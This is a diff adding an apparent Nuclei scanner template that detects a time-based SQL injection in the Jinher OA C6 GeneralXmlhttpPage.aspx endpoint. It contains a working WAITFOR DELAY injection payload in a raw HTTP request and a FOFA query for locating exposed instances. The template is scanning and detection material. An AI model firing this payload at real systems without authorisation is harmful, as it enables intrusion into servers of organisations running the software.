@@ -1,0 +1,31 @@
+id: jinher-oa-c6-GeneralXmlhttpPage-sqli
+info:
+  name: 金和 OA c6 GeneralXmlhttpPage.aspx - sqli
+  author: leadlife
+  severity: high
+  description: 金和 OA C6 接口 /C6/Jhsoft.Web.appraise/GeneralXmlhttpPage.aspx 存在SQL注入漏洞。
+  reference: 
+    - https://github.com/wy876/POC/blob/1ff8a0f8154bdaf1dbf0148f25af1d2d38d24f96/%E9%87%91%E5%92%8COA-C6-GeneralXmlhttpPage.aspx%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    verified: true
+    fofa-query: body="/jc6/platform/sys/login" || body="JHSoft.Web.AddMenu" || app="金和网络-金和OA" || "JC6金和协同管理平台"
+  tags: jinher,sqli,time,oa
+
+http:
+  - raw:
+      - |+
+        @timeout: 15s
+        GET /C6/Jhsoft.Web.appraise/GeneralXmlhttpPage.aspx/?type=CheckAppraiseState&id=1'%3b+WAITFOR%20DELAY%20%270:0:6%27-- HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
+        Connection: close
+
+    matchers:
+      - type: dsl
+        dsl:
+          - duration >= 5 && duration < 9
+          - status_code == 200
+        condition: and
